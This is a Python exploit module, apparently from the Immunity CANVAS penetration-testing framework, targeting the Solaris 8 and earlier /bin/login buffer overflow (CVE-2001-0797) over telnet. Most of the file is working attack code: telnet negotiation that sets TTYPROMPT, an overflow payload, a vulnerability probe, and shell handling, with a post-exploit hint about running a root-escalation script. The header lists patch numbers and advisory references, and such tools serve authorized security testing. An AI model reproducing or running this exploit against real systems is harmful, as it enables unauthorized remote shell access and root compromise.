#! /usr/bin/env python
"""
Sparc Solaris <= 8 /bin/login exploit for CANVAS

"""

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation

notes="""
These may be fixes for this vulnerablity, however they apply to telnetd
and this vulnerability has to be in login.

Solaris 8: 110668-03
Solaris 8x86: 110669-03

Solaris 7: 107475-04
Solaris 7x86: 107476-04

Solaris 2.6: 106049-04
Solaris 2.6x86: 106050-04

Solaris 2.5.1: 103640-40
Solaris 2.5.1x86: 103641-40

solaris 8 login fix: 111085-02
solaris 7 login fix: 112300-01
solaris 2.6 login fix: 105665-04
solaris 2.5.1 login fix: 106160-02

"""
import sys
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import select
import string
import time
from exploitutils import *
from libs.ctelnetlib import Telnet
sys.path.append('encoder')
import addencoder
sys.path.append("shellcode")
import win32shell
import canvasengine

from tcpexploit import tcpexploit
from shelllistener import shelllistener
from shelllistener import shellfromtelnet
import unixShellNode

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Sun"
DOCUMENTATION["Date public"]="12/12/2001"
DOCUMENTATION["CERT Advisory"]="http://www.cert.org/advisories/CA-2001-34.html"
DOCUMENTATION["CVE Name"] = "CVE-2001-0797"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0797"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]="http://cert.uni-stuttgart.de/archive/bugtraq/2002/10/msg00029.html"
DOCUMENTATION["Post-Exploit"]="After you exploit this, upload, chmod +x and run ./bin2root.sh to get root privs"

DESCRIPTION="Solaris Login Overflow"

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Solaris"] ]

GTK2_DIALOG="dialog.glade2"
NAME="Sun Login Overflow"

runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.setPort(23)
        self.setHost("")
        self.setVersion(1)
        self.badstring="\x00"
        self.username=""
        self.prompt="$ "
        self.username="bin"
        
        self.name=NAME
        return
    
    def sendall(self,buf):
        if self.covertness>=9:
            snort_sendall(self.s,buf)
        else:
            self.s.sendall(buf)

    def IAC_neg(self):
        self.log("[*] Sending telnet negotiation")
        # IAC DO TELOPT_SGA
        buf = s_binary("ff fd 03");
        self.s.sendall(buf)

        # IAC WONT TELOPT_LOGOUT
        buf=s_binary("ff fc 12");
        # IAC WONT TELOPT_NAWS
        buf+=s_binary("ff fc 1f");
        # IAC WONT TELOPT_XDISPLOC
        buf+=s_binary("ff fc 23");
        # IAC WILL TELOPT_NEW_ENVIRON
        buf+=s_binary("ff fb 27");
        # IAC WONT TELOPT_OLD_ENVIRON
        buf+=s_binary("ff fc 24");
        # IAC DONT TELOPT_ECHO
        buf+=s_binary("ff fe 01");
        # IAC WONT TELOPT_NAWS
        buf+=s_binary("ff fc 1f");
        # IAC WONT TELOPT_XDISPLOC
        buf+=s_binary("ff fc 23");
        # IAC WONT TELOPT_OLD_ENVIRON
        buf+=s_binary("ff fc 24");
        # IAC WILL TELOPT_TTYPE
        buf+=s_binary("ff fb 18");
        # IAC SB TELOPT_TTYPE TELQUAL_IS "vt100"
        buf+=s_binary("ff fa 18 00");
        buf+="vt100"
        # IAC SE
        buf+=s_binary("ff f0");
        self.s.sendall(buf)
        time.sleep(1)
        self.log( "[*] Setting TTYPROMPT")
        # IAC SB TELOPT_NEW_ENVIRON TELQUAL_IS NEW_ENV_VAR TTYPROMPT xxxx 
        buf=s_binary("ff fa 27 00 00 54 54 59 50 52 4f 4d 50 54 01 78 78 78 78 20");
        # IAC SE
        buf+=s_binary("ff f0");
        self.sendall(buf[:5])
        self.s.sendall(buf[5:])

        # IAC WONT TELOPT_ECHO
        buf=s_binary("ff fc 01");
        # IAC DONT TELOPT_ECHO
        buf+=s_binary("ff fe 01");
        self.s.sendall(buf)
        time.sleep(1)
        return

    def do_exploit(self):
        self.log("[*] Sending overflow")
        buf=self.username
        buf+=" "
        expstr = "c "
        while len(expstr) != 140:
            expstr=expstr + "c "

        buf+= expstr
        #\\n\r\n 
        buf+=s_binary("5c 6e 0d 0a");
        self.s.sendall(buf)

    def test(self):
        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.username=self.argsDict.get("username",self.username)
        
        #first make socket connection to target
        self.log("Connecting to %s:%d"%(self.host,self.port))
        #self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s = self.gettcpsock()
        try:
            self.s.connect((self.host, int(self.port)))
        except:
            self.log("Could not connect!")
            return 0
        
        try:
            self.IAC_neg()
            #8 seconds timeouts
            rd, wr, ex = select.select([self.s], [], [], 8) 
            if not rd:
                return 0
            if self.s.recv(1024).find("ogin:") != -1:
                return 0
            
            self.s.sendall("\n")
            
            rd, wr, ex = select.select([self.s], [], [], 8) 
            if not rd:
                return 0
            
            resp = self.s.recv(1024)
            #print resp
            if resp.find("xxxx") != -1:
                #found vulnerable resp
                #self.log("Remote end is potentially vulnerable to /bin/login overflow")
                return 1
            else:
                return 0
            
        except:
            return 0
   
    def run(self):
        """
        Actually exploit the target.
        """
        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.username=self.argsDict.get("username",self.username)
        
        self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
        #first make socket connection to target
        self.log("Connecting to %s:%d"%(self.host,self.port))
        #self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s = self.gettcpsock()
        try:
            self.s.connect((self.host, int(self.port)))
        except:
            self.log("Could not connect!")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0
        self.IAC_neg();
        self.do_exploit(); 
      
        # need to add error checking 
        telnetshell=Telnet()
        telnetshell.sock=self.s
        try:
            shell=shelllistener(shellfromtelnet(telnetshell))
            node=unixShellNode.unixShellNode()
            node.parentnode=self.argsDict["passednodes"][0]        
            node.shell=shell
        except:
            self.log("Connection closed during exploit - server is patched.")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return None
        self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        #shell should always be valid here....
        return node
        
    def usage(self):
        print "Usage: "+sys.argv[0]+" -t target [ -p targetport ] -O username:username"

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

